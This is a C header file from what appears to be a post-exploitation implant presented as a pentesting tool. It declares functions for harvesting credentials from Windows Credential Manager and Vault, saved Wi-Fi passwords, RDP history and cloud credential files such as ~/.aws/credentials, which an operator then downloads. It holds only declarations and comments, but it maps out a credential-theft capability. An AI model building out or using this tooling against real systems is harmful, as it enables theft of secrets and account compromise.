/*
 * cred_harvest.h — Credential harvesting for pentesting.
 *
 * Non-destructive credential discovery from:
 *   - Windows Credential Manager (Vault API)
 *   - Wi-Fi profiles (saved passwords via wlanapi)
 *   - Autologon credentials (registry — delegated to registry_ops)
 *   - RDP saved connections (registry enumeration)
 *   - Cloud credential files (AWS, Azure, GCP config file checks)
 *
 * All read-only. No LSASS touching, no injection.
 */
#ifndef CRED_HARVEST_H
#define CRED_HARVEST_H

#include <windows.h>

/*
 * Dump Windows Credential Manager (Vault) entries.
 * Uses vaultcli.dll for Vault API: VaultEnumerateVaults,
 * VaultOpenVault, VaultEnumerateItems, VaultGetItem.
 *
 * Shows: target, username, credential type, last modified.
 * Note: actual passwords may require SYSTEM or specific vault access.
 */
int cred_dump_vault(unsigned char *outBuf, DWORD outBufSize, DWORD *bytesWritten);

/*
 * Dump Windows Credential Manager using CredEnumerateW.
 * Simpler API than Vault — returns CREDENTIAL structures.
 * Shows: target, username, type, password (if readable).
 */
int cred_dump_credman(unsigned char *outBuf, DWORD outBufSize, DWORD *bytesWritten);

/*
 * Enumerate saved Wi-Fi profiles and extract passwords.
 * Uses wlanapi.dll: WlanOpenHandle, WlanEnumInterfaces,
 * WlanGetProfileList, WlanGetProfile (with plaintext flag).
 *
 * Requires: running in user context or SYSTEM.
 * SYSTEM can read all profiles; regular user can read their own.
 */
int cred_dump_wifi(unsigned char *outBuf, DWORD outBufSize, DWORD *bytesWritten);

/*
 * Enumerate saved RDP connections from registry.
 * Checks: HKCU\Software\Microsoft\Terminal Server Client\Servers
 * Shows: hostname, username hint.
 */
int cred_dump_rdp_history(unsigned char *outBuf, DWORD outBufSize, DWORD *bytesWritten);

/*
 * Check for cloud credential files on disk.
 * Looks for:
 *   ~/.aws/credentials
 *   ~/.azure/accessTokens.json
 *   ~/.config/gcloud/credentials.db
 *   %APPDATA%\gcloud\credentials.db
 *   %USERPROFILE%\.kube\config
 *
 * Does NOT read file contents — just reports existence and size.
 * Operator can then use download command to retrieve.
 */
int cred_find_cloud_creds(unsigned char *outBuf, DWORD outBufSize, DWORD *bytesWritten);

#endif /* CRED_HARVEST_H */
